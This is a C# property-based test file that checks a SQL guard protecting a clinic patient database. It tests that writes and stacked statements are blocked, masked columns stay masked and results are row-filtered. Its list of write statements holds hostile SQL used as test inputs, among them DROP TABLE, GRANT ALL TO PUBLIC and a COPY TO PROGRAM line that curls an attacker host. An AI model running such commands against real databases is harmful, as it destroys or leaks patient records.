using FsCheck;
using FsCheck.Fluent;
using GuardedDbMcp.Guard;
using GuardedDbMcp.Masking;
using GuardedDbMcp.Policy;
using GuardedDbMcp.Sql;

namespace GuardedDbMcp.UnitTests.Sql;

/// <summary>
/// Invariants of the parser and guard, checked on generated input. These are the properties the security
/// argument rests on, so they are tested on thousands of cases rather than a handful of examples.
/// </summary>
public sealed class GuardPropertyTests
{
    private static readonly QueryGuard Guard = TestPolicy.Guard();
    private static readonly QueryGuard OracleGuard = TestPolicy.Guard(SqlDialect.Oracle);
    private static readonly string[] AllColumns = [.. SqlGenerators.PlainColumns, .. SqlGenerators.MaskedColumns];

    private static readonly string[] WriteStatements =
    [
        "DROP TABLE patients", "DELETE FROM patients", "UPDATE patients SET tckn = NULL", "INSERT INTO patients VALUES (1)",
        "TRUNCATE patients", "GRANT ALL ON patients TO PUBLIC", "ALTER TABLE patients ADD x INT", "CREATE TABLE x (a INT)",
        "SET ROLE postgres", "COPY patients TO PROGRAM 'curl attacker.example'", "CALL p()", "BEGIN", "COMMIT",
    ];

    [FsCheck.Xunit.Property(MaxTest = 1000)]
    public Property Rendering_is_a_fixed_point_of_parsing() =>
        Prop.ForAll(Arb.From(SqlGenerators.Query(AllColumns, AllColumns)), query =>
        {
            foreach (var dialect in new[] { SqlDialect.PostgreSql, SqlDialect.Oracle })
            {
                var once = SqlRenderer.Render(query, dialect).Text;
                var twice = SqlRenderer.Render(Parser.ParseQuery(once), dialect).Text;
                if (once != twice)
                {
                    return false.Label($"{dialect}: {once} != {twice}");
                }
            }

            return true.ToProperty();
        });

    [FsCheck.Xunit.Property(MaxTest = 2000)]
    public Property The_guard_is_total_it_never_throws() =>
        Prop.ForAll(Arb.From(Gen.OneOf(ArbMap.Default.GeneratorFor<string>(), Mutations())), sql =>
        {
            var decision = Guard.Inspect(sql, TestPolicy.Clinic1);
            var oracle = OracleGuard.Inspect(sql, TestPolicy.Clinic1);
            return (decision.Allowed == (decision.Sql is not null)) && (oracle.Allowed == (oracle.Sql is not null));
        });

    [FsCheck.Xunit.Property(MaxTest = 1000)]
    public Property A_second_statement_is_never_accepted() =>
        Prop.ForAll(
            Arb.From(SqlGenerators.Query(SqlGenerators.PlainColumns, SqlGenerators.PlainColumns)),
            Arb.From(Gen.Elements(WriteStatements.Concat(["SELECT 1", "SELECT * FROM patients"]).ToArray())),
            Arb.From(Gen.Elements(";", "; ", ";\n", " /* c */ ; ", "; -- x\n")),
            (query, second, separator) =>
            {
                var sql = SqlRenderer.Render(query, SqlDialect.PostgreSql).Text + separator + second;
                return !Guard.Inspect(sql, TestPolicy.Clinic1).Allowed;
            });

    [FsCheck.Xunit.Property(MaxTest = 500)]
    public Property Write_statements_are_never_accepted_whatever_surrounds_them() =>
        Prop.ForAll(
            Arb.From(Gen.Elements(WriteStatements)),
            Arb.From(Gen.Elements(string.Empty, "  ", "/* hi */ ", "-- x\n", "\n\t")),
            Arb.From(Gen.Elements(string.Empty, ";", " ", " -- end")),
            (statement, prefix, suffix) =>
                !Guard.Inspect(prefix + statement + suffix, TestPolicy.Clinic1).Allowed
                && !Guard.Inspect($"WITH x AS ({statement} RETURNING *) SELECT * FROM x", TestPolicy.Clinic1).Allowed);

    [FsCheck.Xunit.Property(MaxTest = 1000)]
    public Property Any_filter_that_depends_on_a_masked_column_is_rejected() =>
        Prop.ForAll(Arb.From(SqlGenerators.Predicate(2, SqlGenerators.MaskedColumns)), predicate =>
        {
            var sql = "SELECT id FROM patients WHERE " + SqlRenderer.RenderExpression(predicate, SqlDialect.PostgreSql);
            var decision = Guard.Inspect(sql, TestPolicy.Clinic1);
            var mentionsMasked = SqlGenerators.MaskedColumns.Any(c => sql.Contains($"\"{c}\"", StringComparison.Ordinal));
            return (!mentionsMasked || decision.Code == GuardCode.ProtectedColumnInPredicate)
                .Label($"{sql} -> {decision.Code}");
        });

    [FsCheck.Xunit.Property(MaxTest = 1000)]
    public Property Every_output_derived_from_a_masked_column_is_masked() =>
        Prop.ForAll(Arb.From(SqlGenerators.Query(AllColumns, SqlGenerators.PlainColumns)), query =>
        {
            var sql = SqlRenderer.Render(query, SqlDialect.PostgreSql).Text;
            var decision = Guard.Inspect(sql, TestPolicy.Clinic1);
            if (!decision.Allowed)
            {
                return true.Label("rejected: " + decision.Code);
            }

            var items = ((SelectCore)query.Body).Items.Cast<ExpressionItem>().ToList();
            for (var i = 0; i < items.Count; i++)
            {
                var text = SqlRenderer.RenderExpression(items[i].Expression, SqlDialect.PostgreSql);
                var mentionsMasked = SqlGenerators.MaskedColumns.Any(c => text.Contains($"\"{c}\"", StringComparison.Ordinal));
                if (mentionsMasked && ColumnMask.For(decision.Columns[i].Lineage).Strategy == MaskStrategy.None)
                {
                    return false.Label($"unmasked output {i}: {text}");
                }
            }

            return true.ToProperty();
        });

    [FsCheck.Xunit.Property(MaxTest = 1000)]
    public Property Every_allowed_query_is_row_filtered_and_row_limited() =>
        Prop.ForAll(
            Arb.From(SqlGenerators.Query(AllColumns, SqlGenerators.PlainColumns)),
            Arb.From(Gen.Choose(1, 200)),
            (query, limit) =>
            {
                var decision = Guard.Inspect(SqlRenderer.Render(query, SqlDialect.PostgreSql).Text, TestPolicy.Clinic1, limit);
                if (!decision.Allowed)
                {
                    return true.ToProperty();
                }

                var text = decision.Sql!.Text;
                var fetch = long.Parse(text[(text.LastIndexOf("FETCH FIRST ", StringComparison.Ordinal) + 12)..].Split(' ')[0], System.Globalization.CultureInfo.InvariantCulture);
                return (text.Contains("FROM \"clinic\".\"patients\" WHERE (\"clinic_id\" = @p0)", StringComparison.Ordinal)
                        && decision.Sql.Parameters.All(p => Equals(p.Value, 1L))
                        && fetch <= limit + 1)
                    .Label(text);
            });

    /// <summary>Near-miss inputs: valid queries with one character inserted, removed or swapped.</summary>
    private static Gen<string> Mutations() =>
        from query in SqlGenerators.Query(AllColumns, AllColumns)
        let text = SqlRenderer.Render(query, SqlDialect.PostgreSql).Text
        from position in Gen.Choose(0, text.Length - 1)
        from c in Gen.Elements(';', '\'', '"', '(', ')', '-', '/', '*', '$', '@', ':', '\0', ';', 'x')
        from mode in Gen.Choose(0, 2)
        select mode switch
        {
            0 => text.Insert(position, c.ToString()),
            1 => text.Remove(position, 1),
            _ => text.Remove(position, 1).Insert(position, c.ToString()),
        };
}
